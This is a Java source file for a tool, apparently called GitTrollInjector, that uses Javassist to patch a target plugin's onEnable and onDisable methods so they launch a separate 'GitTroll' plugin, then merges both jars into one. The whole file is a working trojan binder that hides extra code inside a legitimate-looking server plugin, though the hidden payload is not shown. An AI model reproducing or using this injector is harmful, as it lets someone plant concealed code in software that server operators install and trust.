package net.Lenni0451.GitTrollInjector;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import javassist.ClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import net.Lenni0451.GitTrollInjector.utils.JarCombiner;
import net.Lenni0451.GitTrollInjector.utils.PluginJarUtils;

public class Injector {

	public static void main(String[] args) throws Throwable {
		Scanner s = new Scanner(System.in);
		
		System.out.print("Enter the GitTroll jar path: ");
		String gitTrollInPath = s.nextLine();
		
		System.out.print("Enter the path of the other plugin you want GitTroll to be injected into: ");
		String otherPluginInPath = s.nextLine();
		
		System.out.print("Enter the combined plugin output path: ");
		String combinedOutPath = s.nextLine();
		
		s.close();

		PluginJarUtils otherPluginUtils = new PluginJarUtils(new File(otherPluginInPath));
		
		Map<String, byte[]> retransformedClasses = new HashMap<>();
		
		ClassPool classPool = ClassPool.getDefault();
		ClassPath gitTrollPath = classPool.insertClassPath(gitTrollInPath);
		ClassPath otherPluginPath = classPool.insertClassPath(otherPluginInPath);

		{
			String otherMain;
			CtClass ctClass = classPool.get(otherMain = otherPluginUtils.getMain());
			try {
				CtMethod ctMethod = ctClass.getDeclaredMethod("onEnable");
				ctMethod.insertAfter("new net.Lenni0451.GitTroll.GitTroll(this).onEnable();");
			} catch (Throwable t) {
				CtMethod ctMethod = CtMethod.make("public void onEnable() {new net.Lenni0451.GitTroll.GitTroll(this).onEnable();}", ctClass);
				ctClass.addMethod(ctMethod);
			}
			retransformedClasses.put(otherMain.replace(".", "/") + ".class", ctClass.toBytecode());
		}
		{
			String otherMain;
			CtClass ctClass = classPool.get(otherMain = otherPluginUtils.getMain());
			if(ctClass.isFrozen()) ctClass.defrost();
			try {
				CtMethod ctMethod = ctClass.getDeclaredMethod("onDisable");
				ctMethod.insertAfter("new net.Lenni0451.GitTroll.GitTroll(this).onDisable();");
			} catch (Throwable t) {
				CtMethod ctMethod = CtMethod.make("public void onDisable() {new net.Lenni0451.GitTroll.GitTroll(this).onDisable();}", ctClass);
				ctClass.addMethod(ctMethod);
			}
			retransformedClasses.put(otherMain.replace(".", "/") + ".class", ctClass.toBytecode());
		}

		classPool.removeClassPath(gitTrollPath);
		classPool.removeClassPath(otherPluginPath);
		
		JarCombiner.combineJars(new File(gitTrollInPath), new File(otherPluginInPath), new File(combinedOutPath), retransformedClasses);
	}

}
